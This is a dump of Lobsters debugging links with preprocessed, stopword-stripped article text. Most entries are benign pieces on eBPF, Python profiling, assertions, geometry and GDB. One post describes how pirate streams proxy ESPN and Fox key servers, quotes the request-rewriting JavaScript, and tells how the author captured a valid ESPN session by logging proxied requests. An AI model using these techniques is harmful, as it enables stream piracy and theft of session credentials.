fully appreciate additional abstraction bcc python binding provided initially expected bcc python binding thin wrapper around libbcclibbpf turn quite bit moreover also painted picture sort functionality rust wrapper around bpf look like example little openperfbuffer method turned quite bit logic behind also contained innocuous helper function getonlinecpus took many line c code implement see next section struggle c nevertheless got basic working endtoend started polish thing starter introduced getoptlong arg parsing could support exact option opensnooppy also discovered unused variable bpf program fixed upstream also discovered bpf program extra division believe necessary ensure value would still fit python int converted deleted step since concern program finally moved definition common header file could shared opensnoopc codegen step felt cleaner trying keep python c version sync opensnooppy finally time declare program complete truth told entire project first time writing straight c though read quite bit part reading advanced programming unix environment edition covertocover story another blog post started eden little two year ago never written c c literally zero although point would easier implement opensnoop c decided stick get firsthand experience writing nontrivial c program thing missed c raii missed able leverage compiler ensure resource released reliably example used wrapping file descriptor folly file ensure file descriptor closed folly file go scope avoiding need call close explicitly instead took cue libbpfc used goto first time life filling trepidation could think xkcd entire time thing missed second c standard library notably std string std vector example definition simple utility function bcc python binding getonlinecpus def readcpurange path cpu open path r f cpusrangestr fread cpurange cpusrangestrsplit rangeop cpurangefind rangeop cpusappend int cpurange else start int cpurange rangeop end int cpurange cpusextend range start return cpu def getonlinecpus return readcpurange sysdevicessystemcpuonline compare equivalent version wrote straight c int getonlinecpus int cpu sizet numcpu int fd open sysdevicessystemcpuonline ordonly ocloexec fd return const int bufsize char buf bufsize int numread read fd buf bufsize int iscloseok close fd numread bufsize numread prepared output big empty errno einval return else iscloseok return ensure content buf nulterminated strtol read unintended value buf numread sizet capacity cpu malloc capacity sizeof int cpu null return int lastendindex int lasthyphenindex sizet numelements sizet numread numread buf errno int rangestart strtol buf lastendindex endptr null base errno return int rangeend lasthyphenindex errno rangeend strtol buf lasthyphenindex endptr null base errno return else rangeend rangestart int numcpustoadd rangeend rangestart int extraspace capacity numelements numcpustoadd extraspace sizet newsize capacity extraspace cpu realloc cpu newsize sizeof int cpu null return capacity newsize int j j numcpustoadd j cpu numelements rangestart j lastendindex lasthyphenindex else buf lasthyphenindex numcpu numelements return obvious difference size code responsible extra line first line responsible reading content sysdevicessystemcpuonline char checking intermediate return value error ensuring file descriptor get closed life certainly lot easier use existing library function throw anything go wrong loop logic bit verbose couple reason first api strtol bit wonky reset errno calling check afterwards secondly returning array whose size known compile time logic realloc necessary grateful write code way time seems exhausting though large c project sure would builduse library help task whereas tried keep opensnoop single c file ultimately furthered desire replace c code rust wherever possible part conclusion next step journey challenging exercise learn lot new thing space ton documentation incidentally paternity leave work access coworkers tap suggestion got stuck nevertheless coming side feel much confident venturing unfamiliar domain proficient gdb strace sure always keep copy linux source locally grep future although project started attempt teach debug performance issue ended focusing building tool using ebpf although get deep former initial question still want explore well work latter performance engineering biggest surprise brendan number checklist tool run rather one tool run everything checklist print summary possible hard create one size fit tool sort thing use method requires start functional diagram system general tool expected know least without configuration despite challenge think could big opportunity cursory understanding space feel like lot cli cobble together make applicationspecific performance tool lot library perhaps right place start know would inclined build tool top library access programmatically rather write bunch logic parse stdout various format home paternity leave like bunch massive distributed system lying around house whose performance needed tuning word seems difficult improve one skill abstract feel like area build knowledge experience stage way could remember tool work offhand least know brendan diagram exists use starting point said brendan julia example talk would run program sort bad behavior treating black box walking way would use different tool poke system figure going revealing source code program end would amazing someone put together sort online learning course way teach performance engineering certainly pay ebpf thoroughly enjoyed learning ebpf mainly focused using kprobes realize integration point played yet uprobes tracepoints xdp general idea able dynamically safely efficiently add functionality kernel user space pretty awesome excited see ifhow ebpf extended domain example phd student ashish bijlani recently presented prototype used ebpf improve fuse performance also remember android device also running linux bit effort ebpfbased tool used diagnose issue phone well though trying use ebpf tool specific device sure crosscheck version linux kernel running android device set bpf feature supported kernel term c version opensnoop know anyone really need plan try popularize put final version code repo others easily look link general like checking generated code made exception case think valuable people able study without installingbuilding bcc order generate finally rstrace set repo probably mess around little bit paternity leave come end expect much time near future one thing plan include source libbpf verbatim rstrace repo sync upstream periodically people build rstrace without building bcc discovered submitting small patch rustbcc project trying figure support multiple version bcc rather avoid headache altogether easier include source directly need libbpf libbcc hopefully find time rstrace never actually got write rust part exploration thus far
273,Lobsters,debugging,Debugging,"Illegal streams, decrypting m3u8's, and building a better stream experience",https://blog.jonlu.ca/posts/illegal-streams,illegal stream decrypting building better stream experience,background http live streaming hlsjs issue http archive format chrome extension chrome security electron unsafe clone espn fox moving forward,lived u majority life often needed rely illegal stream watch america sport game experience stream say least extremely poor sort crypto miner running background well dozen ad covering stream wholeheartedly support ad free content unfortunately sort ad show stream terrible best malicious worsti wanted research figure way quickly export stream watch elsewherebackgroundhttp live streaming hl one common live streaming standard healthy open source community around building tool infrastructure hl notably hlsjs hl designed reliability dynamically adapts network condition optimizing playback available speed wired wireless connection fairly complicated spec core followslive stream start input usually either live event static file streamed live event server requires medium encoder offtheshelf hardware way break encoded medium segment save file file categorized playlist file usually file extension client software begin fetching index file using url identifies stream index file turn specifies location available medium file decryption key alternate stream available selected stream client downloads available medium file sequence file contains consecutive segment stream sufficient amount data downloaded client begin presenting reassembled stream user playlist example collection t link extxkey uri redacted keyformat identity keyformatversions t file actual medium chunk file use file format client responsible fetching decryption key authenticating presenting user interface allow authentication decrypting medium file neededthis process continues client encounter extxendlist tag index file extxendlist tag present index file part ongoing broadcast ongoing broadcast client load new version index file periodically client look new medium file encryption key updated index add url queuethis mean fairly trivial extract live stream playlist format livestream plug site nothing wrapper video elementi experimented bit found fastest way would go network tab filter point copy paste url program play watch stream vlc quicktime work work perfectly well unobfuscated simple stream however trying stream like stopped working url parameter would exactly right vlc player would workthe streamer started using http header verificationissuesall new stream would additional header common one header referer sent stream match one expecting would respond playlist file even used jwts http cooky make sure stream ripped others ironic unfortunately common desktop player allow customize cooky header sent request find another solutioni wanted make tool would quickly extract stream start playing without needing manually type header option cooky unfortunately chrome provide easy direct access network request devtools extension access chromedevtools api access api though export network request http archive format contains everything need exactly recreate requesti built quick chrome extension would thatonce har blob could encode pas html file created simple wrapper around hlsjs seen belowfunction loadhar let token token val token try let harstring atob token let har jsonparse harstring consolelog har let request harrequest let streamurl requesturl let cooky requestcookies let header requestheaders loadvideo streamurl cooky header catch e consoleerror e point could scan page playlist file retrieve har encode pas onto small static site still work thoughchrome securitychrome refuse set certain header one time tried deconstruct har recreate xmlhttprequest would warn console header chose set unsafe refuse apply way around unfortunately turned fastest way keeping work done far reaching working solution electronelectronelectron cross platform open source framework creating desktop apps little bloated effectively running chrome node make anyone limited amount ram shudder effectively way run webapps desktop real plus suffer restriction static html pagei started porting everything electron worked pretty much box displaying custom sitehowever since electron based chromium making regular xmlhttprequests still let apply header use node library make http request library using hlsjs browser library lack direct integration nodefortunately hlsjs provides way overload http loader function really need custom loader though needed version xmlhttprequest need go chromiumenter clonesthere library emulate xmlhttprequest node found one worked imported overloaded custom loader one exactly used http module rather library also refused set unsafe header time easy fix though could fork remove code check header thus born published npm change experience yak shaving made donald knuth proud got stream working also added option make viewing experience better dark mode forcing live modeespn fox within last month interesting trend arisen illegal stream link actual espn fox cbs stream inspect network request see streamer linking directly stream stream beautiful quality would hardly every stutter awkward minimize window streaming check problem get bootlegged streamershow real provider use encryption built hl prevent illegal streamsthe streamer done something much clever actually authenticating stream valid key setting proxy server official keyservers wrapping request valid keyseach playlist file field go retrieve key decrypt streamthe streamer would override xmlhttprequest open function url keyserver would send proxy function open xmlhttprequestprototypeopen function method url async user pas urlindexof mediaapi rewrittenurl urlreplace http mediaapifoxsportsgocomprograms http redacted gth else urlindexof mediaapi rewrittenurl urlreplace http mediaapifoxsportsgocomprograms http redacted gth else urlindexof playbacksvcsplusespncom rewrittenurl urlreplace http playbacksvcsplusespncomevents http redacted gth else rewrittenurl url opencall method rewrittenurl async user pas xmlhttprequestprototypeopen point wanted know stream certain stream would encode url actually requested pas proxiesi tried changing url person site know reply back site url http jonluca encodedat point made educated guess take url passed url parameter applies hard coded authentication server make request reply back result however server currently checking host sending cookiesheaders correct one ie espn fox cbs etc built quick http server would dump request content stdout threw server http jonlucastream encoded sent proxy key serveri monitored log sudden valid session streamer interest privacy commented partial credential entirely valid work stream espnmoving forwardunfortunately implementing reverse aes keyservers bit beyond scope wanted weekend project settled electron app made best part stream directly chromecast behave like native video nonstream ad much direct low level control stream worked pretty much every live event watched online including keynotesi think much else explore stream exactly reproducible touch button complicated worth investing effort find stream seem reverse love hear leave comment email directlycomments found reddit
274,Lobsters,debugging,Debugging,All programmers must learn C and Assembly (2017),https://www.deconstructconf.com/2017/joe-damato-all-programmers-must-learn-c-and-assembly,programmer must learn c assembly,transcript,transcript editor note transcript nt talk justice transcript useful searching reference recommend watching video rather reading transcript alone reader typical speed reading take le time watching video miss body language speaker slide hi welcome talk called programmer must learn c assembly greeting name joe like computer blog called timetobleedcom generally speaking always time bleed nt really time blog personal blog anymore want hear talk computer follow twitter joe damato ceo founder company called packagecloud small bootstrap startup make easy developer create manage repository rpm debian ruby gem python java package check artifact storage need anyway talk today generally speaking talk like give tire fire talk little bit different know keep everything honest right generally speaking talk involving computer involves amount tire may may fire fine whatever talk little bit reality check right want examine actual real palpable reality know programmer must exist sort way dealing existence environment obviously along way numerous tire fire going try navigate boat think one way start talk computing computing environment sort like subject opening three question think programmer potentially thought point career think first question would pose programmer prevent going obsolete right make sure skill stuff use today keeping employable today also keep employable future second question programmer increase efficiency time right get better work done amount time get code deployed thirdly set tool invest time energy reuse every time need something different nt need learn whole set new tool every single time claim answer question infinitely question far like computing related simply become proficient c assembly question answered immediately mean becoming proficient c assembly mean need able sit compute bootloader top skull really advocating saying becoming familiar c assembly getting point feel comfortable reading talking looking thing online pay enormous dividend make case need start really important diagram sort fundamental basis like everything else want say next diagram super important yeah actually picture roasting computer saying greeting actual diagram amazingly beautiful diagram drew like obviously computer see bottom layer computer comprised hardware right like next layer operating system system library right like stuff implemented c assembly right might wonder care stuff operating right operating system programmer system programmer care stuff written c assembly use looking leave like sort interesting philosophical quote talk know guy named churchill said back look farther forward likely see smart guy quote think applies computer computing environment nt matter whether ruby programmer python programmer java programmer goalline programmer whatever programmer right faced environment whatever end adding top right ruby programmer adding adding another slab c assembly ruby vm adding like slab ruby code top right still subject everything going true python programmer right adding another slab c assembly python vm slab python code top thing nodejs programmer right thing sort like trying make everyone notice looking diagram essentially nt really matter candy coating outside chewy chocolatey center always c assembly nt matter think really interesting analogy right look actual science real engineering right roll earth take slab earth probably get something like actually look sort like layer rock planet understand lot evolution planet time sort creature existed different period went extinct really interesting thing earth actually work effect earth environment creature different stage development planet right nt really matter put top earth stuff still underneath right nt matter building burj khalifa dubai whatever building barnyard wherever people build barnyard building huge tire fire nt really matter underneath still subject earth plate tectonics everything else fail take account stuff nt technology sort subject bad thing happening right like case earthquake right taking consideration thing build something invent really cool stuff like earthquake resistant building right prevent stuff collapsing think analogy make lot sense applied computing well immutable thing something seems immutable right like system library operating system vm stuff building structure top hopefully point talk thinking really dope right best talk ever totally agree like actually get started right learning stuff never messed really complicated right like lot different pathway turn actually begin compute c assembly answer question prepared another really important diagram think really really help explain one way like think diagram little bit shocking please prepare freshly hatched human actually cousin kid name luciano one name hard say without embellishing little bit luciano anyway dope thing little homie luciano nt come universe cigar mouth sit kitchen table say yo pasta e fagioli actually learn italianamerican new jersey english word word learned people like mom dad around talking saying stuff right like sort confronted saw pattern right imprinted brain like slowly surely started using sound word slowly build get point actually speak italianamerican new jersey english right take time take lot looking stuff saying weird thing right baby say weird stuff learn speak right think true learning anything computing especially thing typically people perceive difficult namely operating system system library c assembly taking analogy getting back computing think two really important thing read lot want get point feel comfortable messing operating system layer two thing think read man page source code new computing nt compute linux whatever man page like documentation read command line various tool various aspect operating system source code obviously important read lot different way right go internet read stuff github download source code tip way like read source code use debian ubuntu system want read source code something could run aptget source whatever computer figure assemble source exactly way assembled prior compiled computer make sure looking source thing actually curious cool right lot source code read lot man page read want invest future ability compute put first penny investment get started care posit opinion posit want get system programming knowing bunch dope stuff computer put first penny jar ptrace ptrace related tool like strace ltrace gdb think ptrace best place start think best place start look diagram computer system learning ptrace give specific slice give slice right orange important slice able take bite nt matter anything put going able understand whatever put interacts everything right ruby programmer let say extra layer whatever get added top write ruby program example open file read file writes data file whatever able take bite computer right middle orange part going reflect everything code actually ruby land true python code nodejs code whatever right convinced good place start right actually begin journey right would recommend begin journey learning strace ltrace right begin reading man page strace read read like million time read man page ltrace read million time start using trace everything sight right developing bunch program development workstation whatever trace shit keep tracing get tired tracing stuff thing use tool going get confronted huge amount output going really confusing really overwhelming way luciano feel trying learn speak right confronted pattern word none mean anything right like slowly time going see pattern emerge going copy going able speak going happen right run strace look system call output keep long enough eventually going make sense good thing actually read unlike luciano mean want learn particular thing f strace output mean read man page go google whatever right think honestly opinion best way start want get convinced learning computer important want think really good way start would go step would say nt learn use tool learn tool actually work right nt stop learning use strace ltrace nt stop using every single day whatever actually figure strace trace system call ltrace trace library call actually work answer question ptrace right ptrace really really complicated piece linux machinery strongly recommend everyone try read man page ptrace least probably going need read least time really really complicated expose huge amount really important interface really complex part computer system lot program lot piece operating environment actually rely ptrace existing get second anyway read man page ptrace like million time minimum read program us program us program like strace run aptget source strace get source code strace actually read shit ptrace well like said lot thing rely ptrace strace ltrace gdb debugger relies ptrace linux runtime dynamic linker relies ptrace right like way linker let program know library loaded using really weird trick using ptrace something called libthreaddb relies ptrace libthreaddb make possible debug multithreaded program right ever wondered yo gdb know thread program debug multithreaded program libthreaddb answer right ever wonder want know debug multithreaded program read source libthreaddb see relies ptrace right thing hovering around ptrace think ptrace really important place invest time energy understanding look going lie open pandora box sort go rabbit hole figure stuff work life forever different never cat laying bed lavender enjoying environment everything going pretty pretty bad open box going show thing find open box shortly pretty gnarly like history right like earth history earth nt like super dope right lot bad thing happened know point assume probably least one programmer room functional programmer thinking yeah really cool story joe really nice monad nt afraid side effect would say thing someone would say one thing nt part show take seat second thing cool compute haskell compute ocaml whatever want end day still end assembly program anyway truthfully nt really matter trying keep computing flowing program whenever want end day understanding c assembly going help regardless whether haskell programmer ruby programmer java programmer whatever ok sort explained think layer computer important take away think useful show couple example thing find using tool like strace going show two really interesting bug could find using strace actually ripple effect stack higher level programming language first one bug little story time main point story bug actually ok amazon turn set system call run slower actual real computer reason happens actually kind complicated gist story essentially set system call system call gettimeofday part gettimeofday name implies system call programmer use get time day program use system call regularly use much actually everything log message time stamp constructing sql query time stamp anything involves timing performance gettimeofday used lot used much linux kernel actually added entire feature called vdso allows system call system call including gettimeofday others run much much faster every system call people calling system call much way vdso thing work sort imagine making function call kernel essentially system call imagine calling kernel really expensive bunch kernel programmer like yo would nt dope could move system call kernel program way program need call gettimeofday infinity time much much inexpensively calling kernel vdso allows happen right run strace program nt see system call gettimeofday vdso preventing system call happening right increasing efficiency program preventing expensive thing happening making system call turn bunch reason impossible look strace output program anything timing information see gettimeofday strace output ever see gettimeofday strace output computer something wrong entire feature vdso added linux specifically prevent happening stumbled across buddy mine sent strace output like yo help figure program scrolled like yo hold gettimeofday anyway read exactly happens going url posted slide online check deconstructcom hashtag find read technical deep dive exactly impossible affect every language right language use gettimeofday timing information whether ruby java python nt matter right like everyone affected running code affected ok next story time another strace story actually pertains java function call java called getcurrentthreadcputime function supposed supposed return amount cpu time java thread consumed way implemented implemented using something called posix clock turn linux kernel prior support posix clock kernel time something wanted compute thread cpu time needed open bunch file read bunch data convert data another format bunch math could compute amount time thread consumed cpu turn someone running java code calling function getcurrentthreadcputime like yo really really slow happening straced saw strace output every time thought getting time actually opening like infinity file reading infinity gigabyte data infinity amount math turn really really slow much slower making single call kernel ended getting fixed kernel added actual support posix clock jvm updated take advantage know program built top like performance monitoring program could call getcurrentthreadcputime without tanking cpu system know computed someone submitting strace output really slow running java program want read check bitlyjavaslow know think idea pretty interesting right think idea basically feel like programmer sort perpetuate meme like myth x slow x bad without actually data behind right heard lot people say year like java slow whatever nt know started nt know came maybe thing like part whole idea java could potentially slow like another bigger thing sort much complicated bug want get could solve reading code interesting bug going get tried explain bug usually try go story everyone start like beach scene saving private ryan everyone laid beach whatever usually happens start telling story gnarly anyway meme computing thread slow heard repeated various news website one context switch expensive context switch slow way scale application event driven programming whatever right universally completely false actually false anytime anyone ever say context switch expensive context switch slow scale program event find curled like piece fried shrimp back room somewhere convulsing please stop saying turn pretty good theory meme started people seem think event driven programming scalable whatever thread think actual answer think identified culprit believe culprit really gnarly story know nt know many familiar big deal program people used linux drawing ui essentially thing display window manager get gui linux anyway bug fix introduced course seven year completely broke thread linux really badly took seven year change went someone figure different part damaged fix later right thread broken really long time course seven year lot people trying build scalable application trying write research paper measuring stuff people like yo thread slow right going tell story feature added sort evolution fixed nt know hope boring right first story time like series story time explain bug three thing happen time computing history really important three thing first computer invented right computer invented keep mind point everyone computing opcodes program worked right everyone like yo thing universe program came right lot program started misbehaving assumption built source assumption suddenly became invalidated ran computer like thing number one happened simultaneously right know window managing thing module loading system lot way linux dynamically load code program running right way turn way old existed way program dynamically load code runtime built runtime loader thing bunch module people wanted use built computer since built computer started failing computer assumption built code would try run window manager would segfault model nt designed world way sort stuff sort revolves around system call called mmap mmap system call use program get bunch ram kernel right going sort show mmap sort center like thread breaking seven year june story start basically someone idea kernel programmer like ok look code expects still think running computer exploding computer either make every single person fix code provide way program allocate memory make look like still running computer decision made add way allocate memory using mmap look sort running computer essentially tricking program would stop segfaulting commit message went kernel say add new mmap flag force mapping low address space flag added flag useful elf loader right like going add fix problem month later november someone commits something ok new thing use kernel let start using knob allocate memory way wo nt cause module explode anymore fast forward like year january sorry couple month fast forward couple month january train really really start go rail new knob added map knob commit go kernel make mapped first usually used map small code model hell mean turn different way store program computer computer hard drive read back one way storing computer program using specification called elf explains store program disk right different way arranging elf program depending trying one way something called small code model small code model say going use way running program ok map memory first address space current developer like ok want support use case let take leave map definitely fine month later february basically saying someone reporting like yo context switching really slow try make system call much slower happened investigation realized problem march change went glibc change comment change linux one extra requirement stack must first otherwise ca nt use thread paraphrasing little bit otherwise explain lot weird stuff people basically saying thread need thread memory first otherwise thread wo nt work right know went thing fine month later may decided ok ca nt get memory first right creating bunch thread suddenly run memory first going next decided add retry mechanism right changed comment changed code said ok prefer memory allocated low since allows faster context switch also added retry mechanism go fail allocate memory try allocate memory anywhere else right strategy give memory think context switch fast ca nt give give whatever got important thing change comment change code essentially justification use knob changed completely right initially thread nt work unless use knob thread faster use knob two different thing fast forward like five year august infamous thing posted linux kernel mailing list call pardo report someone named pardo posted said yo mmap slow map allocation failure sometimes causing thread creation run three order magnitude slower one case creating new thread go cycle million cycle le thread second right thing slow tremendously time actually happened slow thousand time slowed time interesting right like thing showed added glibc speed right justification use flag get memory certain region faster u use right flag saw earlier map right turn lot smaller bit actually happening person consumed entire address space hard gigabyte ram ended happening subsequent allocation fell back retry mechanism added glibc basically happening person trying allocate bunch thread consumed memory right retry mechanism kicked year retry mechanism causing linear search kernel turn add thread linear search get bigger bigger bigger linear search large list bad slow pretty dope thing added speed retry mechanism thing made time slower fine fixed right got situation started adding added knob called changed meaning knob without changing name knob used like weird retry mechanism nt actually work one understood actual intention knob begin changed internally right fix answer kernel answer question fix adding another knob fine new knob added anytime need create thread linux knob called mapstack definition use mapstack need allocate thread stack mapstack actually nt anything completely ignored placed thing people use make think something fine adding probably remove right wrong forever already exposed program already built assuming would exist like weirdness ie map also remains forever fine computing complete tire fire right time go people adding new thing really hard keep track moving piece anyway wrote entire sort time line check check slide online hopefully follow could nt wanted know question run later whatever find hit anyway want leave parting thought learning c assembly mean debug literally anything built modern day computer right sort previous bug showed thing ripple effect programming language built top sort understanding assumption make based keep mind next time someone run say like yo event lot faster thread context switch slow like maybe impression weird thing existed course know nearly eight year anyway thanks applause
275,Lobsters,debugging,Debugging,An awesome new Python profiler: py-spy,https://jvns.ca/blog/2018/09/08/an-awesome-new-python-profiler--py-spy-/,awesome new python profiler pyspy,ben frederickson pyspy rbspy install pip readme pyspy probably stable rbspy libpythondev python binding ruby binding start ecosystem profilers rust procmaps phpspy also rbspy window support rbspy,day learned ben frederickson written awesome new python profiler called pyspy take similar approach profiling rbspy profiler worked earlier year profile running python program us processvmreadv read memory default display profiling information really easytouse way obviously think cool look like profiling python program gif taken github readme great toplike output default default ui somewhat similar rbspy feel better executed install pip another thing done really nice make installable pip run pip install pyspy download binary immediately cool even though pyspy rust program obviously python programmer used installing software pip cargo readme describes distribute rust executable pip without requiring user rust compiler installed pyspy probably stable rbspy another nice thing pyspy believe us python public binding eg pythonh mean public binding header file find libpythondev rbspy contrast us bunch header file inside ruby interpreter python whatever reason includes lot struct definition header file result compare pyspy python binding rbspy ruby binding notice way fewer python binding file v ruby file much smaller v ruby basically think mean pyspy likely easier maintain longterm rbspy since rbspy depends unstable internal ruby interface even though work relatively well today future version ruby could break time start ecosystem profilers rust one thing think super nice rbspy pyspy share code procmaps crate ben extracted rbspy improved substantially think awesome someone want make pyspyrbspylike profiler rust another language like perl javascript something even easier turn phpspy sampling profiler php secret dream could eventually suite open source profilers lot different programming language similar user interface today every single profiling tool different pain also rbspy window support ben also contributed window support rbspy amazing pyspy window support start want profile ruby python program window
276,Lobsters,debugging,Debugging,Sega bass fishing - bad polys,https://www.supermodel3.com/Forum/viewtopic.php?f=7&t=1561#p15251,sega bass fishing bad polys,register term use privacy policy register,register order login must registered registering take moment give increased capability board administrator may also grant additional permission registered user register please ensure familiar term use related policy please ensure read forum rule navigate around board term use privacy policy register
278,Lobsters,debugging,Debugging,Assertions in Production Code? (2008),http://www.drdobbs.com/architecture-and-design/assertions-in-production-code/228700788,assertion production code,assertion production code,assertion production code august assertion runtime test put code perform check logic program correct alternatively known program invariant part contract programming assertion validate user input program example assertion might check array index within bound array number odd actually odd etcasserts common enough language like programming language special syntactical construct themasserts proven effective finding logic bug debugging program question often come happens asserts production code asserts stay removed recently debated length complangcmoderated argument favor removing along line production code run fasterprofessionally written production code bug free need assertsan assert firing cause program abort may permissible may cause data loss look unprofessional customerthe data checked may matter anyway check first let explain bit coming started engineering life working airframe manufacturer designing flight control system airliner failure system cause crash everybody dy company u engineer powerful incentive design system would crashthey interesting approach common aerospace industry part considered suspect design evaluated basis part fails answer plane crash engineer went back workin word airplane withstand total failure part systemit applies hardware avionics software well wo nt go boring detail even though software gone line line lot people software still treated become possessed evil moment try crash airplane loaded selfchecking software selfchecking hardware computer doublechecking answer etcif someone arrived saying could write software perfect design perfect test coverage backup redundancy checking required flying well wo nt writing software aerospace companieshigh reliability achieved making perfect design achieved making design tolerant failure runtime checking essential fault detected program go controlled state thing like aborting harm donealerting user result reliablesaving work processengaging backup systemrestarting system known good stategoing safe mode await instructionsi find option far preferable going unknown state praying would engage airplane autopilot software runtime checking would fire missile flight control computer doublechecks crazy control output would want defibrillator applied double check voltage applied xray machine intensity nt care smart good believe testing want backup everyone else whose life depends computer pilot life old age nt believe gas gauge flight go unscrews cap put stick gas tank check gas one nt like john denver read paper next day
279,Lobsters,debugging,Debugging,Better Geometry Through Graph Theory,http://ideolalia.com/2018/08/28/artifex.html,better geometry graph theory,spent summer canonical textbook computational geometry project parametric curve polygon clipping doublyconnected edge list hard embracing uncertainty errorcorrecting code artifex,spent summer month ago decided implement set operation curved region canonical textbook computational geometry described approach polygon comprised straight line seemed like project extended technique parametric curve figured would take couple week unfortunately field computational geometry embodies fundamental contradiction geometry angle triangle add exactly radian u clockwise v v must counterclockwise u computer hand use floating point representation make mockery simple euclidean truth academic literature largely ignores algorithm proven geometrically sound robust implementation left exercise reader akin world hash collision caused unavoidable data loss academic response implicitly assume existence perfect hash function paper predicated unrealistic assumption evaluate term must understand empirically well function assumption broken mind look existing algorithm polygon clipping term art polygon set operation every technique variation common theme given two ring find every point intersection segment ring point intersection decide whether segment included based operation performed dozen paper subject differ third step since decision include segment typically inverts intersection point describe variety approach using decision one segment inform decision adjacent segment textbook described method using doublyconnected edge list generic geometric data structure assumed meant could reused problem started implementation month went finished implementation first week reliable dcel collection linked loop incrementally updated performing set operation incrementally bisect original set loop determine included despite best effort kept finding new shape caused adjacent face get tangled together creating strip simultaneously inside outside expected result slowly realized problem data structure first step every paper glossed finding intersection dcel assumes edge vertex total ordering previous edge directly clockwise next one directly counterclockwise miss intersection might conclude two curve clockwise relative causing everything fall apart began look better way find intersection hoping found approach sufficiently accurate work dcel could salvaged unfortunately approach found literature implemented wild better using data structure demanded precise input without internal contradiction deliver point began wonder missed something fundamental thought maybe dissected mature library handled pathological shape could work backwards see gone wrong began feed shape wellestablished project like paperjs found failed badly find pathological input using propertybased testing given random combination shape would perform pointinregion test compare reference result generated querying shape individually combining result according operation input worked fine hundred thousand input would inevitably find failure project turned little le eager find failure mode handful examplebased test others static suite thousand input used validate change missed something appeared one else expected operation particularly robust hard floating point arithmetic best understood simple maddening fact b necessarily equal b might equal might little relative larger two number mean compare two floating point number precise comparison ask whether differ le epsilon value epsilon represents level numerical uncertainty resigned vast folk wisdom around minimize uncertainty fact remains every arithmetic operation injects bit uncertainty grows cumulatively successive operation dealing small number uncertainty may dwarf value intersection precise mathematical sense occurs wherever distance curve exactly zero practical sense wherever distance curve close enough zero least one intersection could easily return three ten within overlapping range uncertainty anathema published technique rely counting intersection determine whether inside outside shape single spurious intersection may cause entire result vanish two object similar curvature move across result tend flicker existence technique may suffice straight line require smaller epsilon wholly unsuited relative imprecision parametric curve embracing uncertainty week passed error uncovered test went feeling random feeling malicious floating point arithmetic may deterministic watched screen waiting test fail imagined demon fpu nudging value flowed past trying move beyond threshold selfconsistency one day realized exactly narrative behind errorcorrecting code assume data randomly altered en route want return consistent state seem like could get right first time fix afterwards consider union two ellipsis ostensibly three point intersection one left two right reason described intersection routine likely find multiple point intersection left curve converge segment left small enough thus imprecise enough spatial intuition problem mislead u reason better think graph decide edge include exclude since trying find union want keep segment outside shape wellformed result single cycle remove cycle leftover edge rely getting lucky edge left might succumbed floating point error believed inside wellformed result cycle bunch leftover edge make consistent need either close loop remove leftover cost change measured aggregate length edge adding removing minimal set change equivalent shortest path dangling vertex found path invert inclusion every edge pass case pass one edge originally excluded add edge back return cycle created alternately edge might think outside case complete cycle extracted single leftover edge search remaining edge shortest path two dangling vertex since pass leftover edge remove every floating point inconsistency surface one two case combination thereof searching shortest path dangling edge find smallest possible edit yield consistent result course consistent result necessarily correct one fact floating point error tend cluster around smallest edge make reasonable heuristic importantly weathered ten million generative test case without issue complete implementation algorithm found sure novel approach least represents meaningful improvement state art open source intuitively feel like might mean avoid epsilon hell wide range geometric numerical algorithm anyone aware prior art vein interested see work artifex library ongoing hope prof useful others look forward sharing project enable near future thanks alex engelberg elana hashman angus fletcher reid mckenzie zack maril feedback early draft post
280,Lobsters,debugging,Debugging,Beej's Quick Guide to GDB,https://beej.us/guide/bggdb/,beej quick guide gdb,beej quick guide gdb content compiling information official gdb documentation ddd datadisplaydebugger license brian beej jorgensen hall creative common attributionnoncommercialno derivative work united state license starting debugger breakpoints breakpoints stepping around examining variable misc stuff stack manipulation additional stepping method breakpoints jumping arbitrary section code breakpoints changing variable value runtime hardware watchpoints attach running process using coredumps postmortem analysis window function display register assembly writing frontend gdb documentation detail quick reference beej beejus,beej quick guide gdb release jun translation quickanddirty guide meant get started gnu debugger gdb command line terminal often time gdb run via ide many people shun ides variety reason tutorial gettingstarted guide much much much learn debugger written short paragraph check man page online resource listed info tutorial meant read order including misc section content compiling tell compiler compile code symbolic debugging information included gcc g switch gcc g helloc hello g g hellocpp hello done able view program listing debugger information check official gdb documentation information shake stick also good gnu gdb frontend ddd datadisplaydebugger license beej quick guide gdb brian beej jorgensen hall licensed creative common attributionnoncommercialno derivative work united state license starting debugger first thing first enter help gdb prompt get information also enter quit quit debugger finally hitting return repeat last command entered let fire several way start debugger eg ide might start particular mode humanfriendly mention two vanilla console mode curse gui mode gui better let quickly cover simple one launch program called hello debugger gdb hello gnu gdb copyright c free software foundation inc license gnu gpl version later http gnuorglicensesgplhtml free software free change redistribute warranty extent permitted law type show copying show warranty detail gdb configured gdb run starting program homebeejhello hello world program exited normally gdb last line gdb prompt waiting tell type r run run program gdb allows abbreviate command become ambiguous start neato highlyrecommended gui mode start debugger gdb tui many example show output gdb dumb terminal mode real life use tui mode exclusively screenshot see approximately normal gdb command work gui mode additionally arrow key pguppgdown key scroll source window focus default also change file function displayed source window giving command list location argument example list bring file helloc line see breakpoints sample location work breakpoints work list command side note list also work dumb terminal mode notice passed name executable command line another option start gdb nothing else command line give command file hello cause executable hello loaded command line argument get something argv program pas argument run command start execution gdb hello gnu gdb copyright c free software foundation inc license gnu gpl version later http gnuorglicensesgplhtml free software free change redistribute warranty extent permitted law type show copying show warranty detail gdb configured gdb run starting program homebeejhello hello world program exited normally gdb notice say starting program show argument passed hello breakpoints starting debugger run program straight nt need stop execution get stepping mode first issue run command need set breakpoint someplace like stop use break b command specify location function name line number source file line number example location used various command well break break mainbreak beginning main function break line current file break line helloc test let set breakpoint main start program gdb hello gnu gdb copyright c free software foundation inc license gnu gpl version later http gnuorglicensesgplhtml free software free change redistribute warranty extent permitted law type show copying show warranty detail gdb configured gdb b main breakpoint file helloc line gdb r starting program homebeejhello breakpoint main printf hello world n gdb see arrived main execution stopped breakpoint set running dumb terminal mode gdb print line execute next running cool gui mode line execute next highlighted source window list current breakpoints use info command like info breakpoints shorter b gdb b main breakpoint file helloc line gdb b num type disp enb address breakpoint keep main clear breakpoint use clear command breakpoint location also clear breakpoint number delete command additionally enable disable breakpoints though two command take breakpoint number argument location enableddisabled status breakpoint visible enb column breakpoint listing gdb b num type disp enb address breakpoint keep main gdb disable gdb b num type disp enb address breakpoint keep n main gdb clear main deleted breakpoint gdb b breakpoints watchpoints stepping around execution stop breakpoint tell debugger thing let start next command n command move next statement current function return function caller stepped end function sample run remember gdb printing line execute next gdb prompt also notice run next printf line see output appear gdb b main 